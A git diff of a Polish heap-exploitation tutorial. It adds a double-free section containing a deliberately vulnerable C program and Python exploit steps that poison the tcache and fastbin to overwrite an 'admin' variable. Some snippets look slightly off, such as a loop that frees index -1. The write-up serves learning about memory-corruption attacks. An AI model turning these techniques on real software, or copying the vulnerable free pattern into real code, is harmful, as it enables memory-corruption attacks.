@@ -36,11 +36,11 @@ Sterta sklada się z kilku rodzajów binów, które przetrzymują wolne chunki -
 
 Sterta zawiera dużo sprawdzeń bezpieczeństwa, ale nadal jest podatna na kilka ataków mogących wpłynąć na wykonanie programu. Zła praktyka programistyczna też nie pomaga w bezpieczeństwie.
 
-### 2. Podstawy
+### 2. Exploity
 
 Aby zapoznać się z podstawowymi exploitami typu heap overflow posługuję się podatnymi aplikacjami z [https://exploit.education/](https://exploit.education/).
 
-#### 2.1
+#### 2.1 -heap overflow
 
 Zacznę od prostego exploita heap overflow - heap zero.
 
@@ -134,7 +134,7 @@ Exploit działa.
 
 ![img_2.png](img_2.png)
 
-#### 2.2
+#### 2.2 use-after-free
 
 Przechodząc do trudniejszego zadania tego samego typu zajmę się - heap two z tej samej strony - to prosty exploit typu use-after-free.
 
@@ -231,4 +231,199 @@ Przy próbie zalogowania widzimy sukces.
 
 ![img_7.png](img_7.png)
 
-2.3
+#### 2.3 - double-free
+
+Następnym omówiony exploitem, będzie double-free. Strategia ta polega na podwójnym uwolnieniu jednego chunka pamięci. W tym przypadku chunk do którego możemy pisać jest uwalniany.
+Kiedy jest on uwolniony pozwala nadpisać pointer do następnego free chunka, tym samym dając arbitrary write.
+
+Jedyny utrudnieniem jest nowa wersja biblioteki, która zapewnia mechanizm cache dla każdego wątku.
+
+Kod aplikacji:
+
+```c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+
+
+
+char important_data[0x10] = "\x30\0\0\0\0\0\0\0";
+char admin[0x10] = "useruser\0";
+
+
+char *users[32];
+int userCount = 0;
+
+void create_user() {
+    char *name = malloc(0x20);
+    users[userCount] = name;
+
+    printf("%s", "Name: ");
+    read(0, name, 0x20);
+
+    printf("User Index: %d\nName: %s\nLocation: %p\n", userCount, users[userCount], users[userCount]);
+    userCount++;
+}
+
+void delete_user() {
+    printf("Index: ");
+
+    char input[2];
+    read(0, input, sizeof(input));
+    int choice = atoi(input);
+
+
+    char *name = users[choice];
+    printf("User %d:\n\tName: %s\n", choice, name, name);
+
+    // Check user actually exists before freeing
+    if(choice < 0 || choice >= userCount) {
+        puts("Invalid Index!");
+        return;
+    }
+    else {
+        free(name);
+        puts("User freed!");
+    }
+}
+
+void complete_level() {
+    if(!strcmp(admin, "admin\n")) {
+        puts("Level Complete!");
+        return;
+    }
+}
+
+void main_loop() {
+    boolean flag = true;
+    while(flag) {
+
+
+        printf(">> ");
+	fflush(stdout);
+        char input[2];
+        read(0, input, sizeof(input));
+        int choice = atoi(input);
+
+        switch (choice)
+        {
+            case 1:
+                create_user();
+                break;
+            case 2:
+                delete_user();
+                break;
+            case 3:
+                complete_level();
+		break;
+            case 4:
+                flag = 0;
+            default:
+                break;
+        }
+    }
+}
+
+int main() {
+    main_loop();
+    return 0;
+}
+```
+
+Moją strategią jest wypełnić `tcache`, a następnie wykonać double-free.
+Definiuję dwie funkcje, które mi w tym pomogą.
+```python
+def malloc(name):
+    p.sendlineafter('>> ','1 '+name)
+
+def free(id):
+    p.sendlineafter('>> ', '2 '+str(id))
+```
+
+
+Alokuje 9 userów, a następnie zwalniam ich w kolejności rosnącej.
+```
+tcache
+p1->p2->p3->p4->p5->p6->p7
+fastbin
+p8->p9
+```
+```python
+for i in range(8):
+    malloc('a') #tcache
+
+malloc('a') #p8
+malloc('a') #p9
+
+for i in range(9):
+    free(i-1)
+
+free(8)
+free(9)
+
+```
+
+
+Teraz check pozwoli na ponowne zwolnienie p8.
+
+```
+tcache
+p1->p2->p3->p4->p5->p6->p7
+fastbin
+p8->p9->p8
+```
+W tym momencie wykonałem atak typu double-free i mogą zapisać dowolną treść w dowolne miejsce.
+Oczywiście w tym przypadku moim celem jest zmienna admin. Wyszukuje jej adres w gdb.
+
+Teraz, aby atak się udało muszę opróźnić tcache - alokuje znowu 7 userów.
+```
+tcache
+empty
+fastbin
+p8->p9->p8
+```
+
+```python
+for i in range(8):
+    malloc('a')
+```
+W tym momencie alokuje usera o nazwie będącej adresem zmiennej admin - `0x0804c048`. Adres ten zapisywany jest w sekcji z danymi chunka `p8`.
+
+Teraz alokuje dwów losowych userów, aby wyczyścić fastbin.
+
+```python
+malloc('\x48\xc0\x04\x08')
+malloc('1')
+malloc('1')
+```
+W momencie wpisania adresu:
+
+![img_9.png](img_9.png)
+
+W chunku p8 znajdują się adresy wynikające ze struktury free chunka. Jest on w fastbinie i jednocześnie podmieniliśmy adres.
+
+Po zalokowaniu dwóch losowych chunków.
+
+![img_10.png](img_10.png)
+
+Następny do alokowania to adres zmiennej admin.
+
+Z uwagi na to, że pointer `fd` wskazujący na następnego wolnego chunka wskazuje na nasz adres - przez podwójne zwolnienie tego chunka - w tym momencie następny zalokowany user pójdzie pod adres zmiennej admin.
+
+```python
+malloc('admin')
+```
+W tym momencie zmienna zostaje nadpisana i kończy się exploit.
+
+![img_8.png](img_8.png)
+
+Największy problemem tego ataku jest to, że adres pod który piszemy musi mieć metadane, które zostaną uznane za chunk - stąd też
+
+```c
+char important_data[0x10] = "\x30\\0\0\0\0\0\0\0";
+```
+
+
+
+
